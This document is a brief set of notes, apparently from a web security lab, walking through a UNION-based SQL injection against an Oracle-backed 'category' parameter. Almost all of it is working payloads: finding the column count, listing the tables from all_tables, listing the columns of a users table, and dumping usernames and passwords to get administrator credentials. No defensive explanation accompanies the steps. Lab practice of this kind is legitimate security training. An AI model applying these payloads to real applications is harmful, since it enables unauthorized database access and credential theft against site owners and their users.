#SQL injection attack, listing the database contents on Oracle

##determine number of col
category=Pets' ORDER BY 3--

##determine which col contain text data
category=Pets' UNION SELECT 'A','B' from dual--

##retrieve the list of tables in the DB
category=Pets' UNION SELECT table_name,NULL FROM all_tables --

##find the name of the table with credentials

##list column names from table USERS_OCYIHO
category=Pets' UNION SELECT column_name,data_type FROM all_tab_columns WHERE table_name = 'USERS_OCYIHO' --

##find the name of the columns for username,password

##list users(username,password) from table USERS_OCYIHO$
category=Pets' UNION SELECT USERNAME_PQXYTM,PASSWORD_CZAPYP FROM USERS_OCYIHO --

##find the administrator credentials







